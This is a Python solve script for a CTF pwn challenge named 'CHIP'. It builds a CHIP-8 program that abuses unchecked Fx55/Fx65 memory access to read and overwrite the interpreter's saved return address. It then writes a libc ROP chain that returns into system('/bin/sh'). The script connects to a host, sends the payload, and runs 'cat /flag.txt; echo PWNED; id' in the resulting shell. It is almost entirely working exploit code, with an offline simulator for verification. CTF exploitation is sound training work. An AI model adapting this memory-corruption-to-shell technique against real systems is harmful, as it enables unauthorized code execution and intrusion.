#!/usr/bin/env python3
"""CHIP -- flu.xxx CTF 2026, pwn (84 pts).

The CHIP-8 interpreter stores `uint16_t I` next to a 4096-byte `memory[]` and
never bounds-checks Fx55/Fx65, so a CHIP-8 program can read and write the whole
`program_state` on the stack -- including the saved return address at
`&memory + 4152`.  The payload *is* a CHIP-8 program: it copies the saved RIP
out, adds four deltas to it with 8-bit arithmetic (the VM has no 64-bit add),
writes a ROP chain back, terminates it with a zero qword and then executes an
unrecognized opcode so main() returns into system("/bin/sh").

usage:
  python3 solve.py --dry-run                 # build and verify offline
  python3 solve.py <host> <port>             # TLS unless --plain is given
"""
import argparse
import re
import socket
import ssl
import struct
import sys
import time

# public/libc.so.6 (debian trixie, BuildID c495b62e...)
R = 0x29CA8          # saved RIP points here (inside __libc_start_call_main)
G_RET = 0x29E57      # ret (stack alignment)
G_POP = 0x2A145      # pop rdi; ret
BINSH = 0x1A5EA4     # "/bin/sh"
SYSTEM = 0x53110     # system

RIP_OFF = 4152       # &state->memory -> saved RIP distance
PTRCOPY = 4200       # untouched 16-byte copy of the two stack qwords
CHAIN = RIP_OFF      # the ROP chain is written over the saved frame
PROGRAM = 0x200      # CHIP-8 code start; read_input() takes 3584 bytes
PAD = 3840           # size of the validated payload file

# 0x6XNN: V[X] = NN      0xANNN: I = NNN      0x8XY4: V[X] += V[Y], VF = carry
# 0x8XY1: V[X] |= V[Y]   0xFX1E: I += V[X]    0xFX55: memory[I+i] = V[i]
# 0xFX65: V[i] = memory[I+i]
ZERO_V14 = 0x6E00


def seti(off, x=14):
    """I = off; ANNN has only 12 bits, so reuse V[x] as the high part."""
    assert 0xFFF <= off <= 0x1FFE, hex(off)
    return [0x6000 | (x << 8) | ((off - 0xFFF) & 0xFF), 0xAFFF,
            0xF000 | (x << 8) | 0x1E]


def add6(delta, xreg0):
    """V[xreg0..xreg0+5] += delta (6-byte little endian) using only 8-bit adds.

    Per byte: V[r] += const, remember that carry in V6, V[r] += carry-in (V7),
    then merge both carries into VF (that is what 0x8F61 does) for the next byte.
    V6/V7/V14 are scratch.
    """
    carry = [0x87F0]                       # V7 = VF (carry-in for byte 1..)
    words = [0x6600, 0x6700]               # V6 = V7 = 0
    for i in range(6):
        r = xreg0 + i
        words += [ZERO_V14 | ((delta >> (8 * i)) & 0xFF)]
        if i:
            words += carry
        words += [0x8000 | (r << 8) | 0xE4]   # V[r] += V14   (VF = carry)
        words += [0x86F0]                     # V6 = VF
        words += [0x8000 | (r << 8) | 0x74]   # V[r] += V7
        words += [0x8F61]                     # VF |= V6
    return words


def copy16(src, dst):
    return seti(src) + [0xFF65] + seti(dst) + [0xFF55]


def build():
    deltas = [G_RET - R, G_POP - R, BINSH - R, SYSTEM - R]
    assert all(0 <= d < (1 << 48) for d in deltas)

    words = copy16(RIP_OFF, PTRCOPY)                       # stash saved RIP/rbp
    # write qword k = copy + delta_k, highest slot first
    for k in reversed(range(4)):
        words += seti(PTRCOPY) + [0xF765]                  # V0..V7 = qword
        words += add6(deltas[k], 0)
        words += [ZERO_V14]
        words += seti(CHAIN + 8 * k) + [0xF755]            # exactly 8 bytes back
    # NULL the 5th qword, then stop with an unrecognized instruction
    words += [0x6000 | (v << 8) for v in range(8)]
    words += seti(CHAIN + 32) + [0xF755]
    words += [0x0000]

    blob = b"".join(struct.pack(">H", w) for w in words)
    assert len(blob) <= PAD, len(blob)
    return blob + b"\x00" * (PAD - len(blob)), words


def simulate(words, fake=R + 0x7F3456700000):
    """Tiny CHIP-8 interpreter: run the payload against a modelled stack."""
    mem = bytearray(4096 + 0x40000)
    V = [0] * 16
    I = 0
    PC = PROGRAM
    for k in range(8):
        mem[RIP_OFF + k] = (fake >> (8 * k)) & 0xFF
    steps = 0
    while steps < 200000:
        steps += 1
        ins = words[(PC - PROGRAM) // 2]
        PC += 2
        if ins == 0:
            break
        op, X, Y, N, NN, NNN = ins >> 12, (ins >> 8) & 0xF, (ins >> 4) & 0xF, ins & 0xF, ins & 0xFF, ins & 0xFFF
        if op == 0xA:
            I = NNN
        elif op == 0x6:
            V[X] = NN
        elif op == 0x8:
            if N == 0:
                V[X] = V[Y]
            elif N == 1:
                V[X] |= V[Y]
            elif N == 4:
                t = V[X]
                V[X] = (V[X] + V[Y]) & 0xFF
                V[15] = 1 if V[X] < t else 0
            else:
                raise SystemExit(f"unexpected 8XY{N:x}")
        elif op == 0xF:
            if NN == 0x1E:
                I = (I + (V[X] & 0xFFF)) & 0xFFFF
            elif NN == 0x65:
                for i in range(X + 1):
                    V[i] = mem[I + i]
            elif NN == 0x55:
                for i in range(X + 1):
                    mem[I + i] = V[i]
            else:
                raise SystemExit(f"unexpected FX{NN:02x}")
        else:
            raise SystemExit(f"unexpected instruction {ins:#x}")

    base = fake - R
    want = [base + G_RET, base + G_POP, base + BINSH, base + SYSTEM, 0]
    got = [int.from_bytes(mem[RIP_OFF + 8 * i:RIP_OFF + 8 * i + 8], "little")
           for i in range(5)]
    return steps, got, want


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?")
    ap.add_argument("port", nargs="?", type=int)
    ap.add_argument("--plain", action="store_true", help="no TLS on non-443 ports")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    payload, words = build()
    if args.dry_run:
        steps, got, want = simulate(words)
        print(f"[*] {len(words)} words, {len(payload)} bytes, {steps} steps")
        for g, w in zip(got, want):
            print(f"    {g:#018x} == {w:#018x}  {g == w}")
        print("[+] model reproduces the ROP chain" if got == want else "[!] mismatch")
        return

    if not args.host:
        ap.error("HOST PORT required (or --dry-run)")
    assert len(payload) == PAD

    sock = socket.create_connection((args.host, args.port), timeout=20)
    if args.port == 443 and not args.plain:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=args.host)
    sock.settimeout(15)

    sock.sendall(payload)                          # read_input() wants one fread
    out = b""
    try:
        while b"CHIP exited" not in out:
            chunk = sock.recv(0x10000)
            if not chunk:
                break
            out += chunk
    except (socket.timeout, OSError):
        pass
    print("PHASE1:", out[-200:].decode("latin-1"), flush=True)

    time.sleep(0.3)                                # shell is up, execve done
    sock.sendall(b"cat /flag.txt; echo PWNED; id\n")
    final = b""
    sock.settimeout(5)
    try:
        while b"PWNED" not in final:
            chunk = sock.recv(0x10000)
            if not chunk:
                break
            final += chunk
    except (socket.timeout, OSError):
        pass
    sys.stdout.buffer.write(final)
    m = re.search(rb"flag\{[^}]*\}", final)
    print("\n[+] FLAG:", m.group(0).decode() if m else "not found")


if __name__ == "__main__":
    main()
